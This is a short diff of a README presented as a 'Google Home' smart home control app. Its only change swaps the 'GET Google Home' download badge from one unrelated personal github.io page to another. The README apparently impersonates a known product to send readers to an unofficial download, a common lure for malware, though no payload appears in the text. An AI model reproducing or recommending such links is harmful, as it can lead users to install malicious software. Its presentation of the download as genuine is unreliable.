@@ -1,6 +1,6 @@
 # Google Home - Smart Home Control App
 
-[![GET Google Home](https://img.shields.io/badge/GET%20%E2%80%94%20Google%20Home-0078D6?style=for-the-badge&logoColor=white)](https://sofiaquluf502.github.io/.github/google-home-app)
+[![GET Google Home](https://img.shields.io/badge/GET%20%E2%80%94%20Google%20Home-0078D6?style=for-the-badge&logoColor=white)](https://ezrahhilljned.github.io/.github/google-home-app)
 
 ## Google Home Control Overview
 
